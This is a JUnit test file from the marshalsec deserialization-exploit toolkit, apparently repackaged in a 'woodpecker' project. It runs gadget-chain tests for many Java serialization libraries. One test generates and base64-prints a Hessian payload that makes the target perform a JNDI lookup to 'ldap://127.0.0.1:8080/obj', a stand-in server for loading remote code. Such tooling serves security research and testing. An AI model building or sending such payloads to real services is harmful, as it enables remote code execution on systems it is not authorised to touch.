
/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
import org.junit.BeforeClass;
import org.junit.Test;

import me.gv7.woodpecker.marshalsec.BlazeDSAMF0;
import me.gv7.woodpecker.marshalsec.BlazeDSAMF3;
import me.gv7.woodpecker.marshalsec.BlazeDSAMF3AM;
import me.gv7.woodpecker.marshalsec.BlazeDSAMFX;
import me.gv7.woodpecker.marshalsec.Burlap;
import me.gv7.woodpecker.marshalsec.Hessian;
import me.gv7.woodpecker.marshalsec.JYAML;
import me.gv7.woodpecker.marshalsec.Jackson;
import me.gv7.woodpecker.marshalsec.Java;
import me.gv7.woodpecker.marshalsec.JsonIO;
import me.gv7.woodpecker.marshalsec.Kryo;
import me.gv7.woodpecker.marshalsec.KryoAltStrategy;
import me.gv7.woodpecker.marshalsec.MarshallerBase;
import me.gv7.woodpecker.marshalsec.Red5AMF0;
import me.gv7.woodpecker.marshalsec.Red5AMF3;
import me.gv7.woodpecker.marshalsec.SnakeYAML;
import me.gv7.woodpecker.marshalsec.XStream;
import me.gv7.woodpecker.marshalsec.YAMLBeans;
import sun.misc.BASE64Encoder;


/**
 * @author mbechler
 *
 */
public class GadgetsTest {

    @BeforeClass
    public static void printVersion () {
        System.err.println("Java version is " + System.getProperty("java.vendor") + " " + System.getProperty("java.version"));
    }


    @Test
    public void blazeDSAMF0 () throws Exception {
        runTests(new BlazeDSAMF0());
    }


    @Test
    public void blazeDSAMF3AM () throws Exception {
        runTests(new BlazeDSAMF3AM());
    }


    @Test
    public void blazeDSAMF3 () throws Exception {
        runTests(new BlazeDSAMF3());
    }


    @Test
    public void blazeDSAMFX () throws Exception {
        runTests(new BlazeDSAMFX());
    }


    @Test
    public void burlap () throws Exception {
        runTests(new Burlap());
    }


    @Test
    public void hessian () throws Exception {
        runTests(new Hessian());
    }


    @Test
    public void jackson () throws Exception {
        runTests(new Jackson());
    }


    @Test
    public void java () throws Exception {
        runTests(new Java());
    }


    @Test
    public void jsonio () throws Exception {
        runTests(new JsonIO());
    }


    @Test
    public void jyaml () throws Exception {
        runTests(new JYAML());
    }


    @Test
    public void kryo () throws Exception {
        runTests(new Kryo());
    }


    @Test
    public void kryoAlt () throws Exception {
        runTests(new KryoAltStrategy());
    }


    @Test
    public void red5AMF0 () throws Exception {
        runTests(new Red5AMF0());
    }


    @Test
    public void red5AMF3 () throws Exception {
        runTests(new Red5AMF3());
    }


    @Test
    public void snakeyaml () throws Exception {
        runTests(new SnakeYAML());
    }


    @Test
    public void xstream () throws Exception {
        runTests(new XStream());
    }


    @Test
    public void yamlbeans () throws Exception {
        runTests(new YAMLBeans());
    }

    @Test
    public void apiRun() throws Exception {
        byte[] x = new Hessian().apiRun("SpringAbstractBeanFactoryPointcutAdvisor",new String[]{"ldap://127.0.0.1:8080/obj"});
        System.out.println(new BASE64Encoder().encode(x));
    }


    private static void runTests ( MarshallerBase<?> marshaller ) throws Exception {
        marshaller.runTests();
    }

}
